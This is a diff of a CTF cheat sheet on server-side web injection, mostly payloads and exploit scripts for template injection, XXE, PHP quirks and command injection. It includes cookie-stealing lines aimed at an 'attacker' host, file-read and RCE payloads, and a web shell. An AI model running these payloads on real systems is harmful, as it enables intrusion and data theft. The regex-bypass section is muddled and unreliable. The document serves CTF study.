@@ -1,16 +1,10 @@
-# CTF Web - Server-Side Attacks
+# CTF Web - Server-Side Injection Attacks
 
 ## Table of Contents
 - [PHP Type Juggling](#php-type-juggling)
 - [PHP File Inclusion / php://filter](#php-file-inclusion--phpfilter)
-- [SQL Injection](#sql-injection)
-  - [Backslash Escape Quote Bypass](#backslash-escape-quote-bypass)
-  - [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
-  - [Second-Order SQL Injection](#second-order-sql-injection)
-  - [SQLi LIKE Character Brute-Force](#sqli-like-character-brute-force)
-  - [SQLi → SSTI Chain](#sqli--ssti-chain)
-  - [MySQL information_schema.processList Trick](#mysql-information_schemaprocesslist-trick)
-  - [WAF Bypass via XML Entity Encoding (Crypto-Cat)](#waf-bypass-via-xml-entity-encoding-crypto-cat)
+- [SQL Injection](#sql-injection) — moved to [sql-injection.md](sql-injection.md)
+- [Python str.format() Attribute Traversal (PlaidCTF 2017)](#python-strformat-attribute-traversal-plaidctf-2017)
 - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
   - [Jinja2 RCE](#jinja2-rce)
   - [Go Template Injection](#go-template-injection)
@@ -18,41 +12,34 @@
   - [ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)](#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)
   - [Mako SSTI](#mako-ssti)
   - [Twig SSTI](#twig-ssti)
+  - [Vue.js Template Injection via toString.constructor (VolgaCTF 2018)](#vuejs-template-injection-via-tostringconstructor-volgactf-2018)
+  - [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
 - [SSRF](#ssrf)
   - [Host Header SSRF (MireaCTF)](#host-header-ssrf-mireactf)
-  - [DNS Rebinding for TOCTOU](#dns-rebinding-for-toctou)
+  - [DNS Rebinding for TOCTOU (Time-of-Check to Time-of-Use)](#dns-rebinding-for-toctou-time-of-check-to-time-of-use)
   - [Curl Redirect Chain Bypass](#curl-redirect-chain-bypass)
 - [XXE (XML External Entity)](#xxe-xml-external-entity)
   - [Basic XXE](#basic-xxe)
   - [OOB XXE with External DTD](#oob-xxe-with-external-dtd)
+  - [XXE via DOCX/Office XML Upload (School CTF 2016)](#xxe-via-docxoffice-xml-upload-school-ctf-2016)
+- [XML Injection via X-Forwarded-For Header (Pwn2Win 2016)](#xml-injection-via-x-forwarded-for-header-pwn2win-2016)
+- [PHP Variable Variables ($$var) Abuse (bugs_bunny 2017)](#php-variable-variables-var-abuse-bugs_bunny-2017)
+- [PHP uniqid() Predictable Filename (EKOPARTY 2017)](#php-uniqid-predictable-filename-ekoparty-2017)
+- [Sequential Regex Replacement Bypass (Tokyo Westerns 2017)](#sequential-regex-replacement-bypass-tokyo-westerns-2017)
+- [PHP hash_hmac Returns NULL with Array Input (AceBear 2018)](#php-hash_hmac-returns-null-with-array-input-acebear-2018)
+- [Smarty SSTI via CVE-2017-1000480 Comment Injection (Insomni'hack 2018)](#smarty-ssti-via-cve-2017-1000480-comment-injection-insomnihack-2018)
 - [Command Injection](#command-injection)
   - [Newline Bypass](#newline-bypass)
   - [Incomplete Blocklist Bypass](#incomplete-blocklist-bypass)
-- [Ruby Code Injection](#ruby-code-injection)
-  - [instance_eval Breakout](#instance_eval-breakout)
-  - [Bypassing Keyword Blocklists](#bypassing-keyword-blocklists)
-  - [Exfiltration](#exfiltration)
-- [Perl open() RCE](#perl-open-rce)
-- [LaTeX Injection RCE (Hack.lu CTF 2012)](#latex-injection-rce-hacklu-ctf-2012)
-- [Server-Side JS eval Blocklist Bypass](#server-side-js-eval-blocklist-bypass)
-- [ReDoS as Timing Oracle](#redos-as-timing-oracle)
-- [API Filter/Query Parameter Injection](#api-filterquery-parameter-injection)
-- [HTTP Response Header Data Hiding](#http-response-header-data-hiding)
-- [File Upload → RCE Techniques](#file-upload--rce-techniques)
-  - [.htaccess Upload Bypass](#htaccess-upload-bypass)
-  - [PHP Log Poisoning](#php-log-poisoning)
-  - [Python .so Hijacking (by Siunam)](#python-so-hijacking-by-siunam)
-  - [Gogs Symlink RCE (CVE-2025-8110)](#gogs-symlink-rce-cve-2025-8110)
-  - [ZipSlip + SQLi](#zipslip--sqli)
-- [PHP Deserialization from Cookies](#php-deserialization-from-cookies)
-- [WebSocket Mass Assignment](#websocket-mass-assignment)
-- [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
-- [Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)](#thymeleaf-spel-ssti--spring-filecopyutils-waf-bypass-apoorvctf-2026)
-- [Java Deserialization (ysoserial)](#java-deserialization-ysoserial)
-- [Python Pickle Deserialization](#python-pickle-deserialization)
-- [Race Conditions (TOCTOU)](#race-conditions-toctou)
+  - [Sendmail Parameter Injection via CGI (SECCON 2015)](#sendmail-parameter-injection-via-cgi-seccon-2015)
+  - [Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)](#multi-barcode-concatenation-to-shell-injection-bsidessf-2024)
+  - [Git CLI Newline Injection via URL Path (BSidesSF 2026)](#git-cli-newline-injection-via-url-path-bsidessf-2026)
+- [GraphQL Injection and Exploitation (Hack.lu CTF 2020, HeroCTF v5)](#graphql-injection-and-exploitation-hacklu-ctf-2020-heroctf-v5)
+  - [Introspection and Schema Discovery](#introspection-and-schema-discovery)
+  - [Query Batching and Aliasing for Rate Limit Bypass](#query-batching-and-aliasing-for-rate-limit-bypass)
+  - [String Interpolation Injection](#string-interpolation-injection)
 
-For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, WeasyPrint, MongoDB injection, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).
+For code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI), see [server-side-exec.md](server-side-exec.md). For SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS, bash brace expansion, Common Lisp injection, PHP7 OPcache, and more, see [server-side-exec-2.md](server-side-exec-2.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).
 
 ---
 
@@ -144,94 +131,45 @@ php://filter/convert.base64-encode/resource=index  # Source code
 
 ## SQL Injection
 
-### Backslash Escape Quote Bypass
-```bash
-# Query: SELECT * FROM users WHERE username='$user' AND password='$pass'
-# With username=\ : WHERE username='\' AND password='...'
-curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
-curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
-```
+SQL injection techniques have been moved to a dedicated file. See [sql-injection.md](sql-injection.md) for all SQL injection techniques.
 
-### Hex Encoding for Quote Bypass
-```sql
-SELECT 0x6d656f77;  -- Returns 'meow'
--- Combined with UNION for SSTI injection:
-username=asd\&password=) union select 1, 0x7b7b73656c662e5f5f696e69745f5f7d7d#
-```
+---
 
-### Second-Order SQL Injection
-**Pattern (Second Breakfast):** Inject SQL in username during registration, triggers on profile view.
-1. Register with malicious username: `' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a`
-2. Login normally
-3. View profile → injected SQL executes in query using stored username
+## Python str.format() Attribute Traversal (PlaidCTF 2017)
+
+**Pattern:** Python's `str.format()` method allows attribute/index traversal on format arguments. When user input reaches `.format(obj)`, attackers can access arbitrary attributes of the passed objects.
 
 ```python
-import requests
+# Leak object attributes via format string
+payload = "{0.__class__.__mro__}"
+payload = "{0.secret_field}"
 
-s = requests.Session()
+# In Flask: endpoint uses new_name.format(player_object)
+# Send: {0.pykemon} to leak all pykemon objects
 
-# Step 1: Store malicious payload (safely escaped during INSERT)
-s.post("https://target.com/register", data={
-    "username": "admin'-- -",
-    "password": "anything"
-})
+# Access nested attributes
+"{0.__class__.__init__.__globals__}"
 
-# Step 2: Trigger — payload retrieved from DB and used unsafely
-# Common triggers: password change, profile update, search using stored value
-s.post("https://target.com/change-password", data={
-    "old_password": "anything",
-    "new_password": "hacked"
-})
-# UPDATE users SET password='hacked' WHERE username='admin'-- -'
-# Result: admin password changed
+# Dictionary key access via bracket notation
+"{0[secret_key]}"
+
+# Chaining attribute and index access
+"{0.__class__.__mro__[1].__subclasses__()}"
 ```
 
-**Key insight:** Second-order SQLi occurs when input is safely stored but later retrieved and used in a new query without escaping. Look for registration→profile update flows, stored preferences used in queries, or any feature that reads back user-controlled data from the database.
-
-### SQLi LIKE Character Brute-Force
+**Common vulnerable patterns:**
 ```python
-password = ""
-for pos in range(length):
-    for c in string.printable:
-        payload = f"' OR password LIKE '{password}{c}%' --"
-        if oracle(payload):
-            password += c; break
+# Vulnerable: user input as format string
+greeting = user_input.format(current_user)
+
+# Vulnerable: format with request object
+message = template_str.format(request)
+
+# Safe alternative: use positional or keyword args only
+greeting = "Hello, {name}!".format(name=user_input)
 ```
 
-### SQLi → SSTI Chain
-When SQLi result gets rendered in a template:
-```python
-payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
-hex_payload = '0x' + payload.encode().hex()
-# Final: username=x\&password=) union select 1, {hex_payload}#
-```
-
-### MySQL information_schema.processList Trick
-```sql
-SELECT info FROM information_schema.processList WHERE id=connection_id()
-SELECT substring(info, 315, 579) FROM information_schema.processList WHERE id=connection_id()
-```
-
-### WAF Bypass via XML Entity Encoding (Crypto-Cat)
-When SQL keywords (`UNION`, `SELECT`) are blocked by a WAF, encode them as XML hex character references. The XML parser decodes entities before the SQL engine processes the query:
-```xml
-<storeId>
-  1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users
-</storeId>
-```
-This decodes to `1 UNION SELECT username FROM users` after XML processing.
-
-**Encoding reference:**
-| Keyword | XML Hex Entities |
-|---------|-----------------|
-| UNION | `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` |
-| SELECT | `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;` |
-| FROM | `&#x46;&#x52;&#x4f;&#x4d;` |
-| WHERE | `&#x57;&#x48;&#x45;&#x52;&#x45;` |
-
-**Key insight:** WAF inspects raw XML bytes and blocks keyword patterns, but the XML parser decodes `&#xNN;` entities before passing values to the SQL layer. Any endpoint accepting XML input (SOAP, REST with XML body, stock check APIs) is a candidate.
-
-**With sqlmap:** Use the `hexentities` tamper script. To prevent `&amp;` double-encoding of entities, modify `sqlmap/lib/request/connect.py`.
+**Key insight:** Unlike `%s` formatting, Python `str.format()` allows dot-notation attribute traversal (`{0.attr.subattr}`) and bracket indexing (`{0[key]}`), turning any format call with user input into an info leak. This is distinct from SSTI — it does not require a template engine, just a `.format()` call where the format string is user-controlled. Look for Flask/Django views that use `.format()` with user input on model objects or request objects.
 
 ---
 
@@ -324,7 +262,58 @@ ${__import__('os').popen('cat /flag.txt').read()}
 
 **Key insight:** Distinguish Twig from Jinja2 via `{{7*'7'}}` — Twig repeats the string (`7777777`), Jinja2 returns `49`. Twig 3.x removed `_self.env` access; use `|map('system')` filter chain instead.
 
-## SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)
+### Vue.js Template Injection via toString.constructor (VolgaCTF 2018)
+
+**Pattern:** Vue.js client-side template injection using constructor chaining to execute JavaScript. When user input is rendered inside a Vue.js template (via `v-html`, server-side interpolation into Vue templates, or reflected into `{{ }}` delimiters), the template expression evaluator executes JavaScript.
+
+**Basic payloads:**
+```javascript
+// Constructor chaining to create and execute a Function object
+${toString.constructor('document.location="http://attacker/?"+document.cookie')()}
+
+// Alternative constructor chain
+{{constructor.constructor('return fetch("http://attacker/?c="+document.cookie)')()}}
+
+// Using the _c (createElement) internal to confirm Vue context
+{{_c.constructor('return 1')()}}
+```
+
+**Payload variations for different Vue versions:**
+```javascript
+// Vue 2.x — template expressions have access to the component scope
+{{constructor.constructor('return this')().document.location='http://attacker/?c='+document.cookie}}
+
+// Vue 2.x — via toString
+${toString.constructor('alert(document.domain)')()}
+
+// Vue 3.x — stricter sandbox, but constructor chaining still works
+{{(_=toString.constructor('return document'))().cookie}}
+```
+
+**Detection and exploitation:**
+```python
+import requests
+
+target = "http://target/page"
+
+# Step 1: Detect Vue.js template injection
+probes = [
+    "{{7*7}}",           # Returns 49 if expressions evaluated
+    "{{toString()}}",    # Returns [object Object] or similar
+    "${7*7}",            # Template literal syntax (some Vue configs)
+]
+for probe in probes:
+    r = requests.get(target, params={"name": probe})
+    print(f"Probe: {probe} -> {r.text[:200]}")
+
+# Step 2: Execute via constructor chain
+payload = "${toString.constructor('document.location=\"http://attacker/?c=\"+document.cookie')()}"
+r = requests.get(target, params={"name": payload})
+```
+
+**Key insight:** Vue.js template expressions evaluate JavaScript. When user input is rendered in a Vue template, `toString.constructor(code)()` creates and executes a Function object, bypassing simple keyword filters. This works because JavaScript's `constructor` property on any object provides access to the `Function` constructor. Vue 2.x is more permissive; Vue 3.x has a stricter expression sandbox but constructor chaining often still works. Look for reflected input in pages that include Vue.js and use `{{ }}` or `v-bind` directives.
+
+### SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)
 
 **Pattern (KameHame-Hack):** Jinja2 SSTI where quotes are filtered, preventing string arguments. Use Python keyword arguments to bypass — `__dict__.update(key=value)` requires no quotes.
 
@@ -340,6 +329,101 @@ ${__import__('os').popen('cat /flag.txt').read()}
 3. The attribute change persists across requests in the session
 
 **Key insight:** When SSTI filters block quotes/strings, Python's keyword argument syntax (`func(key=value)`) operates without any string delimiters. `__dict__.update()` can modify any object attribute to bypass application logic (e.g., game state, auth checks, permission levels).
+
+### Smarty SSTI via CVE-2017-1000480 Comment Injection (Insomni'hack 2018)
+
+**Pattern:** Smarty 3 < 3.1.32 with custom template resources places the template source file path inside a PHP comment (`/* ... */`) in compiled templates. If the path is user-controlled and `*/` is not sanitized, injecting `*/phpcode();/*` breaks out of the comment and executes arbitrary PHP.
+
+```text
+# Vulnerable URL pattern — template ID/path is user-controlled:
+http://target/?id=*/echo file_get_contents('/flag');/*
+
+# What happens server-side in the compiled template:
+# <?php /* source: /path/to/*/echo file_get_contents('/flag');/* */ ?>
+# The injected */ closes the comment, PHP code executes, /* reopens a comment
+```
+
+```php
+// Smarty compiled template (simplified):
+// Before injection:
+<?php /* Smarty version x, compiled from "user_template_name" */ ?>
+
+// After injection with id = */echo file_get_contents('/flag');/*
+<?php /* Smarty version x, compiled from "*/echo file_get_contents('/flag');/*" */ ?>
+// Breaks down to:
+//   /* Smarty version x, compiled from "*/   ← comment ends here
+//   echo file_get_contents('/flag');          ← PHP executes
+//   /*" */                                    ← new comment
+```
+
+```python
+import requests
+
+# Basic file read
+r = requests.get("http://target/", params={
+    "id": "*/echo file_get_contents('/flag');/*"
+})
+print(r.text)
+
+# RCE
+r = requests.get("http://target/", params={
+    "id": "*/system('id');/*"
+})
+print(r.text)
+
+# If parentheses are filtered, use backtick execution:
+r = requests.get("http://target/", params={
+    "id": "*/echo `cat /flag`;/*"
+})
+```
+
+**Key insight:** Smarty places the template source path in a `/* ... */` PHP comment. If the path is user-controlled and `*/` is not sanitized, arbitrary PHP executes. This affects custom Smarty resources (where the template name comes from user input), not the default file-based resource handler. Fixed in Smarty 3.1.32. Look for Smarty template rendering where the template identifier is derived from URL parameters.
+
+---
+
+## PHP hash_hmac Returns NULL with Array Input (AceBear 2018)
+
+**Pattern:** PHP's `hash_hmac()` returns `NULL` (with a warning, not a fatal error) when the `$data` argument is an array instead of a string. Sending `nonce[]=x` via POST forces the parameter to be an array, making the HMAC output predictable since `hash_hmac('sha256', NULL, $secret)` is equivalent to `hash_hmac('sha256', '', $secret)` -- but more critically, when the `$key` argument receives `NULL` from a prior broken `hash_hmac`, all subsequent HMAC computations use an empty key.
+
+```php
+// Vulnerable server code:
+$nonce = $_POST['nonce'];
+$secret = file_get_contents('/secret_key');
+$mac = hash_hmac('sha256', $nonce, $secret);  // returns NULL if $nonce is array
+
+// Later: server uses $mac (NULL) as key for another HMAC
+$token = hash_hmac('sha256', 'gimmeflag', $mac);
+// hash_hmac('sha256', 'gimmeflag', NULL) == hash_hmac('sha256', 'gimmeflag', '')
+// This is a known constant the attacker can precompute!
+```
+
+```python
+import hmac
+import hashlib
+import requests
+
+# Precompute the token that the server will generate when mac=NULL
+# hash_hmac('sha256', 'gimmeflag', NULL) in PHP == HMAC with empty key in Python
+known_token = hmac.new(b'', b'gimmeflag', hashlib.sha256).hexdigest()
+print(f"Predicted token: {known_token}")
+
+# Force nonce to be an array, breaking hash_hmac
+r = requests.post("http://target/getflag", data={
+    "nonce[]": "x",          # PHP receives $_POST['nonce'] as array ['x']
+    "token": known_token      # server-side comparison succeeds
+})
+print(r.text)
+```
+
+```text
+# HTTP request showing the array injection:
+POST /getflag HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+nonce[]=x&token=<precomputed_hmac>
+```
+
+**Key insight:** PHP silently coerces types, and `hash_hmac` with a non-string `$data` argument returns `NULL`/`false` instead of raising an error. Always check if parameters can be forced to arrays via `param[]=value`. This pattern extends to other PHP hash functions: `md5(array())` returns `NULL`, `sha1(array())` returns `NULL`. Any authentication flow chaining hash outputs as keys for subsequent operations is vulnerable when an intermediate hash can be forced to `NULL`.
 
 ---
 
@@ -376,7 +460,7 @@ response, err := http.Get("http://" + c.Request.Host + "/validate")
 
 ---
 
-### DNS Rebinding for TOCTOU
+### DNS Rebinding for TOCTOU (Time-of-Check to Time-of-Use)
 ```python
 rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
 requests.post(f"{TARGET}/register", json={"url": rebind_url})
@@ -411,6 +495,141 @@ Host evil.dtd:
 %eval; %exfil;
 ```
 
+### XXE via DOCX/Office XML Upload (School CTF 2016)
+
+DOCX files are ZIP archives containing XML. Modify `[Content_Types].xml` inside the DOCX to inject XXE payloads that execute when the server parses the uploaded document.
+
+```bash
+# Step 1: Create a minimal DOCX and extract it
+mkdir docx_exploit && cd docx_exploit
+unzip template.docx
+
+# Step 2: Inject XXE into [Content_Types].xml
+cat > '[Content_Types].xml' << 'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
+]>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
+  <Override PartName="/hack" ContentType="&xxe;"/>
+</Types>
+EOF
+
+# Step 3: Repackage as DOCX
+zip -r exploit.docx '[Content_Types].xml' word/ _rels/
+
+# Step 4: Upload to target
+curl -F "file=@exploit.docx" http://target/upload
+# Response or error message may contain base64-encoded file contents
+```
+
+**Key insight:** Any file format based on ZIP+XML (DOCX, XLSX, PPTX, ODT, SVG+ZIP) can carry XXE payloads. The parser often processes `[Content_Types].xml` first, making it the ideal injection point. Use `php://filter/convert.base64-encode` for binary-safe exfiltration.
+
+---
+
+## XML Injection via X-Forwarded-For Header (Pwn2Win 2016)
+
+Application builds XML from HTTP headers (e.g., `X-Forwarded-For`) without sanitization. First-tag-wins XML parsing allows injecting arbitrary elements:
+
+```http
+X-Forwarded-For: 1.2.3.4</ip><admin>true</admin><ip>4.3.2.1
+```
+
+Produces: `<session><ip>1.2.3.4</ip><admin>true</admin><ip>4.3.2.1</ip><admin>false</admin></session>` -- the XML parser takes the first `<admin>true</admin>`, ignoring the legitimate `<admin>false</admin>` that follows.
+
+**Key insight:** XML injection via HTTP headers when server builds XML from header values without escaping. First-match semantics exploit duplicate tags. Check any header that appears in server responses or logs as structured data (`X-Forwarded-For`, `User-Agent`, `Referer`).
+
+---
+
+## PHP Variable Variables ($$var) Abuse (bugs_bunny 2017)
+
+**Pattern:** PHP's variable variables (`$$key`) allow using a variable's value as the name of another variable. When a loop iterates over GET/POST parameters and assigns them as `$$key = $$value`, supplying `?_200=flag` captures `$flag`'s value into `$_200` before it gets overwritten.
+
+```php
+// Vulnerable pattern: loop that processes GET parameters as variable aliases
+foreach ($_GET as $key => $value) {
+    $$key = $$value;  // e.g., key="_200", value="flag" → $_200 = $flag
+}
+// Later: echo $_200;  // outputs the flag
+```
+
+```bash
+# Supply a "safe" output variable name as key, protected variable name as value
+curl "http://target/page.php?_200=flag"
+# PHP executes: $_200 = $flag → flag is now in $_200 which gets echoed
+```
+
+**How to find the output variable:** Look for variables beginning with HTTP status codes (e.g., `$_200`, `$_404`) in the source, or any variable echoed to output that starts with an underscore.
+
+**Key insight:** `$$key` creates arbitrary variable aliases; iterating GET/POST params with `$$key = $$value` lets an attacker redirect protected variables (like `$flag`) into any output variable they control by naming the output variable as the key and the secret variable as the value.
+
+---
+
+## PHP uniqid() Predictable Filename (EKOPARTY 2017)
+
+**Pattern:** PHP's `uniqid()` uses `gettimeofday()` internally. The first 8 hex characters encode the Unix timestamp in seconds, making filenames predictable within a bounded time window.
+
+```php
+// Vulnerable: uses uniqid() to name an uploaded/generated file
+$filename = uniqid() . '_flag.txt';
+// e.g., "5a1b2c3d4e5f6_flag.txt" where first 8 chars = hex(unix_timestamp)
+```
+
+```python
+import requests
+import time
+
+# Know approximate upload time (from server Date header, challenge hint, etc.)
+start_ts = int(time.time()) - 60   # 60 second window before now
+end_ts   = int(time.time()) + 10
+
+for ts in range(start_ts, end_ts):
+    hex_prefix = format(ts, '08x')
+    url = f'http://target/uploads/{hex_prefix}_flag.txt'
+    r = requests.get(url)
+    if r.status_code == 200:
+        print(f"Found: {url}")
+        print(r.text)
+        break
+```
+
+**Narrowing the window:** The server's `Date` response header tells you the server's current time. Record it when triggering file creation; the timestamp in the filename will match that second.
+
+**Key insight:** PHP `uniqid()` first 8 hex chars = Unix timestamp in seconds. The file is fully predictable within a known time window — brute-force is O(seconds in window), typically under 100 requests.
+
+---
+
+## Sequential Regex Replacement Bypass (Tokyo Westerns 2017)
+
+**Pattern:** When a sanitizer applies regex replacements sequentially (not simultaneously), the first replacement can produce a substring that the second replacement should catch — but since the second replacement already ran (or the first runs after the second), the dangerous pattern survives.
+
+```php
+// Vulnerable: replacements run in sequence on the same string
+$input = preg_replace('/on\w+=\S+/', '', $input);   // pass 1: strip event handlers
+$input = preg_replace('/<script[^>]*>/', '', $input); // pass 2: strip script tags
+```
+
+```text
+# Embed the dangerous tag inside the blocked pattern so removal reconstructs it:
+# Input: <scr<script>ipt>
+# Pass 2 strips inner <script> → leaves: <script>
+# The outer "scr...ipt" scaffolding is reassembled after the inner match is removed.
+```
+
+```bash
+# Practical bypass — embed the dangerous string inside the blocked string:
+# If filter strips "script" then strips "on.*=":
+curl "http://target/" --data 'input=<img sron=c onerror=alert(1)>'
+# Pass 1 strips "onerror=" leaving  <img src onerror=alert(1)> with partial strip
+# Exact bypass depends on regex — test with variations like:
+# <scr\x00ipt>, <scr ipt>, embed keyword inside itself
+```
+
+**Key insight:** Sequential regex replacements let pass N reconstruct what pass M already checked. The first replacement produces a pattern the second was designed to catch, but because the second has already run (or the first runs last), the reconstructed dangerous pattern passes through. Always apply sanitization in a single idempotent pass or use a parser-based sanitizer.
+
 ---
 
 ## Command Injection
@@ -426,327 +645,128 @@ curl -X POST http://target/ -d "ip=127.0.0.1%0acat%20flag.txt"
 When cat/head/less blocked: `sed -n p flag.txt`, `awk '{print}'`, `tac flag.txt`
 Common missed: `;` semicolons, backticks, `$()` substitution
 
----
+### Sendmail Parameter Injection via CGI (SECCON 2015)
 
-## Ruby Code Injection
+When CGI scripts pass user input to `sendmail` via `open()` pipe:
 
-### instance_eval Breakout
-```ruby
-# Template: apply_METHOD('VALUE')
-# Inject VALUE as: valid');PAYLOAD#
-# Result: apply_METHOD('valid');PAYLOAD#')
-```
-
-### Bypassing Keyword Blocklists
-| Blocked | Alternative |
-|---------|-------------|
-| `File.read` | `Kernel#open` or class helper methods |
-| `File.write` | `open('path','w'){|f|f.write(data)}` |
-| `system`/`exec` | `open('\|cmd')`, `%x[cmd]`, `Process.spawn` |
-| `IO` | `Kernel#open` |
-
-### Exfiltration
-```ruby
-open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
-# Or: Process.spawn("curl https://webhook.site/xxx -d @/flag.txt").tap{|pid| Process.wait(pid)}
-```
-
----
-
-## Perl open() RCE
-Legacy 2-argument `open()` allows command injection:
 ```perl
-open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
-# Exploit: "|command_here" or "command|"
+open(SH, "|/usr/sbin/sendmail -bm '$user_input'");
 ```
 
----
-
-## LaTeX Injection RCE (Hack.lu CTF 2012)
-
-**Pattern:** Web applications that compile user-supplied LaTeX (PDF generation services, scientific paper renderers) allow command execution via `\input` with pipe syntax.
-
-**Read files:**
-```latex
-\begingroup\makeatletter\endlinechar=\m@ne\everyeof{\noexpand}
-\edef\x{\endgroup\def\noexpand\filecontents{\@@input"/etc/passwd" }}\x
-\filecontents
-```
-
-**Execute commands:**
-```latex
-\input{|"id"}
-\input{|"ls /home/"}
-\input{|"cat /flag.txt"}
-```
-
-**Full payload as standalone document:**
-```latex
-\documentclass{article}
-\begin{document}
-{\catcode`_=12 \ttfamily
-\input{|"ls /home/user/"}
-}
-\end{document}
-```
-
-**Key insight:** LaTeX's `\input{|"cmd"}` syntax pipes shell command output directly into the document. The `\@@input` internal macro reads files without shell invocation. Use `\catcode` adjustments to handle special characters (underscores, braces) in command output.
-
-**Detection:** Any endpoint accepting `.tex` input, PDF preview/compile services, or "render LaTeX" functionality.
-
----
-
-## Server-Side JS eval Blocklist Bypass
-
-**Bypass via string concatenation in bracket notation:**
-```javascript
-row['con'+'structor']['con'+'structor']('return this')()
-// Also: template literals, String.fromCharCode, reverse string
-```
-
----
-
-## ReDoS as Timing Oracle
-
-**Pattern (0xClinic):** Match user-supplied regex against file contents. Craft exponential-backtracking regexes that trigger only when a character matches.
-
-```python
-def leak_char(known_prefix, position):
-    for c in string.printable:
-        pattern = f"^{re.escape(known_prefix + c)}(a+)+$"
-        start = time.time()
-        resp = requests.post(url, json={"title": pattern})
-        if time.time() - start > threshold:
-            return c
-```
-
-**Combine with path traversal** to target `/proc/1/environ` (secrets), `/proc/self/cmdline`.
-
----
-
-## API Filter/Query Parameter Injection
-
-**Pattern (Poacher Supply Chain):** API accepts JSON filter. Adding extra fields exposes internal data.
-```bash
-# UI sends: filter={"region":"all"}
-# Inject:   filter={"region":"all","caseId":"*"}
-# May return: case_detail, notes, proof codes
-```
-
----
-
-## HTTP Response Header Data Hiding
-
-Proof/flag in custom response headers (e.g., `x-archive-tag`, `x-flag`):
-```bash
-curl -sI "https://target/api/endpoint?seed=<seed>"
-curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
-```
-
----
-
-## File Upload → RCE Techniques
-
-### .htaccess Upload Bypass
-1. Upload `.htaccess`: `AddType application/x-httpd-php .lol`
-2. Upload `rce.lol`: `<?php system($_GET['cmd']); ?>`
-3. Access `rce.lol?cmd=cat+flag.txt`
-
-### PHP Log Poisoning
-1. PHP payload in User-Agent header
-2. Path traversal to include: `....//....//....//var/log/apache2/access.log`
-
-### Python .so Hijacking (by Siunam)
-1. Compile: `gcc -shared -fPIC -o auth.so malicious.c` with `__attribute__((constructor))`
-2. Upload via path traversal: `{"filename": "../utils/auth.so"}`
-3. Delete .pyc to force reimport: `{"filename": "../utils/__pycache__/auth.cpython-311.pyc"}`
-
-Reference: https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/
-
-### Gogs Symlink RCE (CVE-2025-8110)
-1. Create repo, `ln -s .git/config malicious_link`, push
-2. API update `malicious_link` → overwrites `.git/config`
-3. Inject `core.sshCommand` with reverse shell
-
-### ZipSlip + SQLi
-Upload zip with symlinks for file read, path traversal for file write.
-
----
-
-## PHP Deserialization from Cookies
-```php
-O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
-```
-Replace cookie with base64-encoded malicious serialized data.
-
----
-
-## WebSocket Mass Assignment
-```json
-{"username": "user", "isAdmin": true}
-```
-Handler doesn't filter fields → privilege escalation.
-
----
-
-## Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)
-
-**Pattern (Sugar Heist):** Spring Boot app with Thymeleaf template preview endpoint. WAF blocks standard file I/O classes (`Runtime`, `ProcessBuilder`, `FileInputStream`) but not Spring framework utilities.
-
-**Attack chain:**
-1. **Mass assignment** to gain admin role (add `"role": "ADMIN"` to registration JSON)
-2. **SpEL injection** via template preview endpoint
-3. **WAF bypass** using `org.springframework.util.FileCopyUtils` instead of blocked classes
+Inject shell commands by breaking out of the quoted context:
 
 ```bash
-# Step 1: Register as admin via mass assignment
-curl -X POST http://target/api/register \
-  -H "Content-Type: application/json" \
-  -d '{"username":"attacker","password":"pass","email":"a@b.com","role":"ADMIN"}'
-
-# Step 2: Directory listing via SpEL (java.io.File not blocked)
-curl -X POST http://target/api/admin/preview \
-  -H "Content-Type: application/json" \
-  -H "X-Api-Token: <token>" \
-  -d '{"template": "${T(java.util.Arrays).toString(new java.io.File(\"/app\").list())}"}'
-
-# Step 3: Read flag using Spring FileCopyUtils + string concat to bypass WAF
-curl -X POST http://target/api/admin/preview \
-  -H "Content-Type: application/json" \
-  -H "X-Api-Token: <token>" \
